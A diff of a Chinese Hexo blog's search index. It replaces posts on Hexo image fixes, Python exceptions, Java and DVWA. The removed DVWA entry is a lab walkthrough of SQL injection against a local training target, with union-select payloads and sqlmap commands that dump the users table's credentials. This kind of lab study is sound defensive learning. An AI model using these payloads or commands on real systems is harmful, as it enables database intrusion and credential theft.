+<p>修改 <code>node_module/hexo-asset-image/index.js</code> 中的（大概58行附近）</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 原来的</span></span><br><span class="line">$(<span class="built_in">this</span>).attr(<span class="string">&#x27;src&#x27;</span>, config.root + link + src);   </span><br><span class="line"><span class="comment">//修改为如下</span></span><br><span class="line">$(<span class="built_in">this</span>).attr(<span class="string">&#x27;src&#x27;</span>, data.permalink +src);		<span class="comment">//data.permalink 是全路径</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>-Hexo</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>docker部署MongoDB副本集</title>
     <url>/2022/04/21/docker%E9%83%A8%E7%BD%B2MongoDB%E5%89%AF%E6%9C%AC%E9%9B%86/</url>
     <content><![CDATA[<h1 id="Docker-部署-MongoDB-副本集"><a href="#Docker-部署-MongoDB-副本集" class="headerlink" title="Docker 部署 MongoDB 副本集"></a>Docker 部署 MongoDB 副本集</h1><hr>
@@ -866,31 +1228,6 @@
       </tags>
   </entry>
   <entry>
-    <title>hexo博客图片不显示解决方案</title>
-    <url>/2022/04/02/hexo%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87%E4%B8%8D%E6%98%BE%E7%A4%BA%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
-    <content><![CDATA[<h1 id="hexo-博客图片无法显示解决方案"><a href="#hexo-博客图片无法显示解决方案" class="headerlink" title="hexo 博客图片无法显示解决方案"></a>hexo 博客图片无法显示解决方案</h1><hr>
-<p>参考：</p>
-<p><a href="https://www.jianshu.com/p/ea78bdd0551f">https://www.jianshu.com/p/ea78bdd0551f</a><br><a href="https://blog.csdn.net/androidV/article/details/105781570">https://blog.csdn.net/androidV/article/details/105781570</a></p>
-<hr>
-<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>根据此问题，网上有许多的解决方法，我也试过很多，根本原因是 hexo 升级后，对应的插件 hexo-asset-image 并未升级，所遗留下来的 bug 。</p>
-<h2 id="网上常见的解决方案"><a href="#网上常见的解决方案" class="headerlink" title="网上常见的解决方案"></a>网上常见的解决方案</h2><h3 id="1-修改博客配置"><a href="#1-修改博客配置" class="headerlink" title="1.修改博客配置"></a>1.修改博客配置</h3><p>修改博客根目录中 _config.yml 文件配置项 post_asset_folder 为 true:</p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
-
-<p>之后当你通过” hexo new ‘文件名’ “ 新建博客后，会产生一个和文件同名的文件夹。</p>
-<p><img src="https://colson-max.github.io/2022/04/02/hexo%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87%E4%B8%8D%E6%98%BE%E7%A4%BA%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/1.png" alt="1"></p>
-<h3 id="2-下载插件"><a href="#2-下载插件" class="headerlink" title="2.下载插件"></a>2.下载插件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-md-格式语言插入图片"><a href="#3-md-格式语言插入图片" class="headerlink" title="3.md 格式语言插入图片"></a>3.md 格式语言插入图片</h3><p>自行 google/baidu</p>
-<h2 id="修改BUG"><a href="#修改BUG" class="headerlink" title="修改BUG"></a>修改BUG</h2><p>开头也说到，这也可能是 hexo 自家的 bug 引起的。下面是修改方案：</p>
-<p>修改 <code>node_module/hexo-asset-image/index.js</code> 中的（大概58行附近）</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 原来的</span></span><br><span class="line">$(<span class="built_in">this</span>).attr(<span class="string">&#x27;src&#x27;</span>, config.root + link + src);   </span><br><span class="line"><span class="comment">//修改为如下</span></span><br><span class="line">$(<span class="built_in">this</span>).attr(<span class="string">&#x27;src&#x27;</span>, data.permalink +src);		<span class="comment">//data.permalink 是全路径</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>-Hexo</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>vsCode配置C环境</title>
     <url>/2022/03/29/vsCode%E9%85%8D%E7%BD%AEC%E7%8E%AF%E5%A2%83/</url>
     <content><![CDATA[<h1 id="VsCode中配置-C-环境"><a href="#VsCode中配置-C-环境" class="headerlink" title="VsCode中配置 C 环境"></a>VsCode中配置 C 环境</h1><hr>
@@ -937,289 +1274,112 @@
       </tags>
   </entry>
   <entry>
-    <title>Python-异常</title>
-    <url>/2022/04/23/Python-%E5%BC%82%E5%B8%B8/</url>
-    <content><![CDATA[<h2 id="Python-异常"><a href="#Python-异常" class="headerlink" title="Python-异常"></a>Python-异常</h2><hr>
+    <title>JavaSE</title>
+    <url>/2022/04/24/JavaSE/</url>
+    <content><![CDATA[<h1 id="Java-SE"><a href="#Java-SE" class="headerlink" title="Java SE"></a>Java SE</h1><hr>
 <p>参考：</p>
-<p><a href="https://jwt1399.top/posts/34992.html#toc-heading-44">https://jwt1399.top/posts/34992.html#toc-heading-44</a></p>
-<p><a href="http://blog.csdn.net/gavin_john/article/details/50738323">http://blog.csdn.net/gavin_john/article/details/50738323</a></p>
-<hr>
-<h3 id="异常报错"><a href="#异常报错" class="headerlink" title="异常报错"></a>异常报错</h3><p>打开一个不存在的文件，找不到 hello.txt 文件，会抛出异常 FileNotFoundError ，</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;hello.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://colson-max.github.io/2022/04/23/Python-%E5%BC%82%E5%B8%B8/1.png" alt="1"></p>
-<h3 id="捕获异常"><a href="#捕获异常" class="headerlink" title="捕获异常"></a>捕获异常</h3><ul>
-<li>把可能产生异常的代码放到 try 中，把相应的处理方法放在 except 中</li>
-<li>程序捕获到了异常，但是 pass 实现了相应的实现，可以把 pass 改成其它的语句</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&#x27;hello.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> IOError:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
-
-<p>此处 except 捕获的异常类型是 IOError ，如果是其它类型，那么 except 将不会生效。</p>
-<p><strong>Python 的一些内建异常</strong></p>
-<table>
-<thead>
-<tr>
-<th>异常类型</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Exception</td>
-<td>常规错误基类</td>
-</tr>
-<tr>
-<td>AttributeError</td>
-<td>对象没有这个属性</td>
-</tr>
-<tr>
-<td>IOError</td>
-<td>输入/输出 操作异常</td>
-</tr>
-<tr>
-<td>IndexError</td>
-<td>序列中没有此索引</td>
-</tr>
-<tr>
-<td>KeyError</td>
-<td>映射中没有这个键</td>
-</tr>
-<tr>
-<td>NameError</td>
-<td>未声明/未初始化对象</td>
-</tr>
-<tr>
-<td>SyntaxError</td>
-<td>Python语法错误</td>
-</tr>
-<tr>
-<td>TypeError</td>
-<td>对类型无效的操作</td>
-</tr>
-<tr>
-<td>ValueError</td>
-<td>传入无效的参数</td>
-</tr>
-<tr>
-<td>ZeroDivisionError</td>
-<td>除（取模）零（所有数据类型）</td>
-</tr>
-</tbody></table>
-<p><strong>捕获多个异常</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&#x27;hello.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)	<span class="comment"># 文件不存在，报错 IOError</span></span><br><span class="line">    <span class="built_in">print</span>(num)		<span class="comment"># num没有被定义，报错 NameError</span></span><br><span class="line"><span class="keyword">except</span> (IOError,NameError):			<span class="comment">#  用元组形式</span></span><br><span class="line">  	<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="获取异常的信息描述"><a href="#获取异常的信息描述" class="headerlink" title="获取异常的信息描述"></a>获取异常的信息描述</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&#x27;hello.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> IOError <span class="keyword">as</span> result:</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># output: [Errno 2] No such file or directory: &#x27;hello.txt&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="try…finally"><a href="#try…finally" class="headerlink" title="try…finally"></a>try…finally</h3><p>在程序中，如果一个段代码必须要执行，即无论异常是否产生都要执行，那么此时就需要使用ﬁnally。 比如文件关闭，释放锁，把数据库连接返还给连接池等</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            content = file.readline()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(content) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span>	<span class="comment"># 读取文件时发生异常，将被读取到</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        file.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;关闭文件&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;没有这个文件&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>-python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DVWA-SQL注入</title>
-    <url>/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="DVWA-SQL注入"><a href="#DVWA-SQL注入" class="headerlink" title="DVWA - SQL注入"></a>DVWA - SQL注入</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
-<li>建议手工注入，可以了解 sql注入 的过程和原理。</li>
-<li>不建议使用工具比如说 sqlmap 来进行数据库的爆破。</li>
-<li>手工注入步骤：<ul>
-<li>1.找注入点</li>
-<li>2.构造注入内容 </li>
-</ul>
-</li>
-</ul>
-<hr>
-<p><strong>强烈建议：</strong>在 docker 上配置 LAMP 环境来搭建靶场，会方便许多，dvwa 是在本地开启的，在本地 windows（ mac 我不知道） 上配置环境会很麻烦。</p>
-<hr>
-<p><strong>参考：</strong></p>
-<p><a href="https://m3lon.github.io/2018/04/02/%E5%9F%BA%E7%A1%80%E7%AF%87-DVWA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/">https://m3lon.github.io/2018/04/02/%E5%9F%BA%E7%A1%80%E7%AF%87-DVWA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/</a></p>
-<hr>
-<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/1.png" alt="1"></p>
-<hr>
-<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><hr>
-<h3 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h3><ul>
-<li><p>判断是否存在注入，注入是<strong>字符型</strong>还是<strong>数字型</strong></p>
-<p>字符型和数字型的区别在于是否存在引号，所以我们输入 <strong>1</strong>  进行注入</p>
-<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/3.png" alt="3"></p>
-<p>再输入 <strong>1’</strong>  进行注入</p>
-<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/2.png" alt="2"></p>
-</li>
-</ul>
-<p>​    根据回显我们可以看出，id 为注入点，而且属于字符型注入。</p>
-<ul>
-<li><p>这样我们就可以通过在语句后面加上注释符可以构造payload来绕过。</p>
-</li>
-<li><p>猜解 SQL 查询语句中的<strong>字段数</strong></p>
-<p>因为要想爆破数据库，就必须通过 Union 查询</p>
-<p>[^一次性查询多条 SQL语句，并将每一条查询语句的结果合并成一个结果集，就需要用到 Union 操作符，这种查询被称为并（union）查询联合查询。类似于连接符 ‘ &amp; ‘ 和管道符 ‘ | ‘]: </p>
-<p>联合查询适用于两种情况：</p>
-<ul>
-<li>从多个表中查询出相似结构的数据，并且<strong>返回一个结果集</strong></li>
-<li>从单个表中多次SELECT查询，将结果<strong>合并成一个结果集</strong>返回。</li>
-</ul>
-<p>所以就要查询 “ 字段数 “，通过 “ order by “ 判断前一个  select 语句的字段数，输入：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 3 #</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/4.png" alt="4"></p>
-</li>
-</ul>
-<p>​        猜测 3 的时候报错！！说明字段数为 2</p>
-<ul>
-<li><p>输入 “ <strong>1’ union select 1,2 #</strong> “</p>
-<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/5.png" alt="5"></p>
-</li>
-<li><p>输入” <strong>1’ union select database(),2 #</strong> “，可知数据库名称为 <strong>dvwa</strong></p>
-<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/6.png" alt="6"></p>
-</li>
-<li><p>获取数据库中的<strong>表名</strong></p>
-<ul>
-<li><p>每一个 mysql 都存在一个系统库 <strong>information_schema</strong> ，所以我们可以构造 payload：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select table_name,2 from information_schema.tables where table_schema=&#x27;</span>dvwa<span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure>
-
-<p>得到数据库中有两张表，<strong>guestbook</strong> 和 <strong>users</strong> 。</p>
-<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/7.png" alt="7"></p>
-</li>
-</ul>
-</li>
-<li><p>获取表中的<strong>字段名</strong></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select column_name,2 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure>
-
-<p>可以看到有很多的字段，最有用的应该是 <strong>user</strong> 和 <strong>password</strong></p>
-<img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/9.png" alt="9.png" style="zoom:70%;"></li>
-<li><p>查找数据</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select user,password from users #</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/9.png" alt="9"></p>
-</li>
-<li><p>MD5 解密</p>
-</li>
-</ul>
-<hr>
-<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><ul>
-<li><p>第一步还是有源码就分析源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	<span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="variable">$id</span> = mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get results</span></span><br><span class="line">	<span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">		<span class="comment">// Display values</span></span><br><span class="line">		<span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">		<span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for end user</span></span><br><span class="line">		<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"><span class="variable">$number_of_rows</span> = mysqli_fetch_row( <span class="variable">$result</span> )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>此级别改为了 POST 提交数据</li>
-<li>对 id 进行了 mysqli_real_escape_string 转义，但我们依然可以发现它的注入类型是数字型注入。</li>
-<li>使用下拉链表选择id值（没啥d用）。</li>
-</ul>
-</li>
-<li><p>抛弃源码，判断注入类型</p>
-<ul>
-<li><p>输入 <code>1</code> 测试一下</p>
-<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/15.png" alt="15"></p>
-<p>可以看出来成功回显。</p>
-</li>
-<li><p>再输入<code>1&#39;</code>测试</p>
-<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/16.png" alt="16"></p>
-<p>报错，我们看过了源码，所以知到这是 mysql 转义的结果，平时我们注入的时候是根本看不到源码的，这时候我们抛弃源码思考的话，会猜测它可能是字符型注入。但是字符型注入的话和 LOW 等级的就一样了。</p>
-</li>
-<li><p>我们输入<code>1abc&#39;</code>测试</p>
-<img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/17.png" alt="17" style="zoom:50%;">
-
-<p>所以我们就发现它不仅仅是转义id，符号也转义了。所以可以判断基本<strong>不算是字符型注入</strong>。</p>
-</li>
-<li><p>确认是否是数字型</p>
-<p>若为数字型，那我们可以进行 <code>1+1=2</code> 的运算的，如图：</p>
-<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/18.png" alt="18" style="zoom:50%;"><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/19.png" alt="19" style="zoom:150%;"></p>
-<p>可以发现二者回显是一样的。</p>
-<ul>
-<li>那我们可以断定它就是数字型注入</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>构造payload注入，绕过<code>&#39;</code>的转义。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 union select column_name,2 from information_schema.columns where table_name=&#x27;users&#x27;7573657273</span><br></pre></td></tr></table></figure></li>
-</ul>
-<hr>
-<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><hr>
-<h2 id="sqlmap-注入"><a href="#sqlmap-注入" class="headerlink" title="sqlmap 注入"></a>sqlmap 注入</h2><hr>
-<h3 id="Low-amp-amp-Medium"><a href="#Low-amp-amp-Medium" class="headerlink" title="Low &amp;&amp; Medium"></a>Low &amp;&amp; Medium</h3><p>Low 和 Medium 是一样的，把 cookie 改一下就行，这里演示以 low 为例。</p>
-<ul>
-<li>检测是否存在SQL注入漏洞</li>
-</ul>
-<p>需要注意的点：dvwa需要登录才能访问漏洞测试页面，所以使用sqlmap时需要提交登录后的cookie</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">&quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> </span><br><span class="line">--cookie=<span class="string">&quot;security=low;PHPSESSID=tmjjudclk48ic7gi3ct1fpkl1u&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/10.png" alt="10"></p>
-<p>检测存在SQL注入点id(GET),数据库类型为mysql。</p>
-<ul>
-<li><p>爆数据库</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">&quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> </span><br><span class="line">--cookie=<span class="string">&quot;security=low;PHPSESSID=tmjjudclk48ic7gi3ct1fpkl1u&quot;</span> -dbs</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/11.png" alt="11"></p>
-</li>
-<li><p>爆数据表</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">&quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> </span><br><span class="line">--cookie=<span class="string">&quot;security=low;PHPSESSID=tmjjudclk48ic7gi3ct1fpkl1u&quot;</span> -D dvwa -tables</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/12.png" alt="12"></p>
-</li>
-<li><p>爆字段</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">&quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> </span><br><span class="line">--cookie=<span class="string">&quot;security=low;PHPSESSID=tmjjudclk48ic7gi3ct1fpkl1u&quot;</span> -D dvwa -T users -columns</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/13.png" alt="13"></p>
-</li>
-<li><p>爆字段内容</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">&quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> </span><br><span class="line">--cookie=<span class="string">&quot;security=low;PHPSESSID=tmjjudclk48ic7gi3ct1fpkl1u&quot;</span> -D dvwa -T users -C <span class="string">&quot;user,password&quot;</span> -dump</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/14.png" alt="14"></p>
-</li>
-</ul>
-<hr>
-<h3 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h3>]]></content>
-      <tags>
-        <tag>-DVWA</tag>
-        <tag>-SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DVWA搭建</title>
-    <url>/2022/04/27/DVWA%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<h1 id="DVWA-搭建"><a href="#DVWA-搭建" class="headerlink" title="DVWA 搭建"></a>DVWA 搭建</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
-<li>DVWA 是一个基于 php / mysql 的web 靶机，提供安全学习和参考的平台。</li>
-<li>DVWA是运行在本地的，所以个人推荐在 服务器/Linux 上搭建，在 windows 平台上使用集成环境还好，分开配置非常麻烦 ( mac 上我不知道 )</li>
-<li>我个人是在 windows 平台配置的，为了写这个博客，在docker上再搞一次。</li>
-</ul>
-<hr>
-<p>参考：</p>
-<p><a href="https://zhuanlan.zhihu.com/p/126668420">https://zhuanlan.zhihu.com/p/126668420</a></p>
-<hr>
-<h2 id="Windows-平台"><a href="#Windows-平台" class="headerlink" title="Windows 平台"></a>Windows 平台</h2><ul>
-<li><strong>建议使用 phpstudy 搭建。</strong></li>
-<li>网上有很多教程，每个人遇到的问题不尽相同，在这就不做阐述了</li>
-</ul>
-<h2 id="Docker-下的-Linux-平台"><a href="#Docker-下的-Linux-平台" class="headerlink" title="Docker 下的 Linux 平台"></a>Docker 下的 Linux 平台</h2><h3 id="1-拉取镜像"><a href="#1-拉取镜像" class="headerlink" title="1. 拉取镜像"></a>1. 拉取镜像</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull vulnerables/web-dvwa</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-运行"><a href="#2-运行" class="headerlink" title="2. 运行"></a>2. 运行</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --rm -it -p 80:80 vulnerables/web-dvwa</span><br></pre></td></tr></table></figure>
-
-<p>之后访问服务器 ip:80 就可以了</p>
-<h2 id="登录-DVWA"><a href="#登录-DVWA" class="headerlink" title="登录 DVWA"></a>登录 DVWA</h2><p><img src="https://colson-max.github.io/2022/04/27/DVWA%E6%90%AD%E5%BB%BA/1.png" alt="1"></p>
-<p>之后登录界面</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 账号： admin</span><br><span class="line"># 密码： password</span><br></pre></td></tr></table></figure>
-
-<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><ul>
-<li>在   DVWA Security   可以调试靶场题目的难度</li>
-</ul>
-<p><img src="https://colson-max.github.io/2022/04/27/DVWA%E6%90%AD%E5%BB%BA/2.png" alt="2"></p>
-]]></content>
-      <tags>
-        <tag>-docker</tag>
-        <tag>-DVWA</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java-反射</title>
-    <url>/2022/04/24/Java-%E5%8F%8D%E5%B0%84/</url>
-    <content><![CDATA[<h1 id="Java-反射"><a href="#Java-反射" class="headerlink" title="Java - 反射"></a>Java - 反射</h1><hr>
-<p>参考：</p>
+<p><a href="https://jwt1399.top/">https://jwt1399.top</a></p>
 <p><a href="https://www.freebuf.com/articles/web/284980.html">https://www.freebuf.com/articles/web/284980.html</a></p>
 <p><a href="https://www.wangan.com/docs/83">https://www.wangan.com/docs/83</a></p>
+<p><a href="https://www.runoob.com/java">https://www.runoob.com/java</a></p>
 <hr>
+<h2 id="Java-枚举"><a href="#Java-枚举" class="headerlink" title="Java-枚举"></a>Java-枚举</h2><hr>
+<h3 id="一、创建-season-对象"><a href="#一、创建-season-对象" class="headerlink" title="一、创建 season 对象"></a>一、创建 season 对象</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> season;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Enumeration01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Season spring = <span class="keyword">new</span> Season(<span class="string">&quot;春天&quot;</span>,<span class="string">&quot;温暖&quot;</span>);</span><br><span class="line">        Season summer = <span class="keyword">new</span> Season(<span class="string">&quot;夏天&quot;</span>,<span class="string">&quot;炎热&quot;</span>);</span><br><span class="line">        Season autumn = <span class="keyword">new</span> Season(<span class="string">&quot;秋天&quot;</span>,<span class="string">&quot;凉爽&quot;</span>);</span><br><span class="line">        Season winter = <span class="keyword">new</span> Season(<span class="string">&quot;冬天&quot;</span>,<span class="string">&quot;寒冷&quot;</span>);</span><br><span class="line"></span><br><span class="line">        autumn.setName(<span 